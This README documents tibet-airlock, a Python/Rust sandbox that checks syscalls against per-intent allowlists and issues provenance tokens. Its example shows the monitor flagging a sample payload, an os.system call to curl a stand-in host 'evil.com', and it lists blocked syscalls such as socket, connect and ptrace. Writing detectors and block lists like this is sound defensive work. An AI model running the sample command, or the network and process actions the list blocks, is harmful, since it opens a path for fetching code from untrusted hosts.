# tibet-airlock

Zero-trust sandbox with TIBET provenance. Kernel isolation in <1ms, cryptographic proof of every execution.

Python client + SNAFT bindings for the [tibet-airlock Rust binary](https://crates.io/crates/tibet-airlock).

## Install

```bash
pip install tibet-airlock
```

Or as part of the TIBET security bundle:

```bash
pip install tibet[security]
```

## Use with Airlock binary (full isolation)

```bash
# Terminal 1: start the airlock
cargo install tibet-airlock
tibet-airlock

# Terminal 2: Python
from tibet_airlock import Airlock

result = Airlock.run("code:execute", "print('hello world')")
print(result.status)        # 200
print(result.safe)          # True
print(result.roundtrip_ms)  # 0.6
print(result.token)         # TIBET provenance token
```

## Use SNAFT directly (no binary needed)

```python
from tibet_airlock import SnaftMonitor

# Monitor syscalls for an intent
monitor = SnaftMonitor("code:execute")
monitor.log_syscall("sys_write")    # OK
monitor.log_syscall("sys_socket")   # VIOLATION - network access!

decision = monitor.triage()
print(decision.is_safe)     # False
print(decision.violations)  # ['sys_socket (blocked: dangerous syscall for any intent)']

# Or scan a payload string
monitor = SnaftMonitor("code:execute")
detected = monitor.scan_payload("import os; os.system('curl evil.com')")
decision = monitor.triage()
print(decision.is_kill)     # True
```

## How it works

```
Intent -> Snapshot Wake (<0.01ms) -> SNAFT Monitor -> Triage -> TIBET Token
```

1. **Intent routing** — each intent maps to a pre-warmed microVM snapshot
2. **SNAFT monitoring** — every syscall checked against intent-specific allowlist
3. **Triage** — violations = instant kill, clean = graceful shutdown
4. **TIBET token** — cryptographic proof of what happened (the 4 dimensions: erin, eraan, eromheen, erachter)

## Blocked syscalls (always dangerous)

`sys_ptrace`, `sys_socket`, `sys_connect`, `sys_dlopen`, `sys_fork`, `sys_clone`, `sys_mount`, `sys_reboot`, `sys_kexec_load`

## Part of TIBET

- Rust binary: [crates.io/crates/tibet-airlock](https://crates.io/crates/tibet-airlock)
- Full ecosystem: `pip install tibet[full]` (28 packages)
- Website: [ainternet.org](https://ainternet.org)

Built by [Humotica](https://humotica.com) for the [AInternet](https://ainternet.org).
